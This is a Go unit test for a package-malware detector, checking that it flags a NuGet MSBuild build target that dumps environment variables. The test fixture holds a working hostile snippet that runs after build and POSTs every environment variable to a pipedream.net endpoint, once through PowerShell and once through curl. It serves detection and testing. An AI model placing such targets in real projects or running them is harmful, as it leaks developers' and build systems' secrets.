package detect

import "testing"

// Atom.* 1.0.0 (GCVE-110-NUGET-2026-000184..188): build/<id>.targets, AfterTargets="Build".
func TestNugetMSBuildEnvEgress(t *testing.T) {
	targets := `<Target Name="X" AfterTargets="Build">
    <Exec Command='powershell -NoProfile -Command "
      $data = @{};
      Get-ChildItem Env: | ForEach-Object { $data[$_.Name] = $_.Value };
      $wc = New-Object System.Net.WebClient;
      $wc.UploadString(\"https://example.x.pipedream.net\", \"POST\", (ConvertTo-Json $data));
    "' ContinueOnError="true" />
    <Exec Command='curl -s -X POST "https://example.x.pipedream.net" --data-binary "@-" &lt;&lt;&lt; "$(env | base64 -w0)"' />
</Target>`
	fs := Detect(&PackageContext{Name: "Atom.Domain", Ecosystem: "nuget", InstallScriptContent: "<!-- ==== build/Atom.Domain.targets ==== -->\n" + targets})
	if classOfID(fs, "P-NUGET-MSBUILD-ENV-EGRESS") != ClassEvidence {
		t.Errorf("not detected: %v", ids(fs))
	}
	benign := `<Exec Command="dotnet tool restore" /><Exec Command="curl -sSfL https://example.org/tool.zip -o tool.zip" />`
	if has(Detect(&PackageContext{Name: "x", Ecosystem: "nuget", InstallScriptContent: benign}), "P-NUGET-MSBUILD-ENV-EGRESS") {
		t.Error("a build download without an environment dump fired")
	}
}
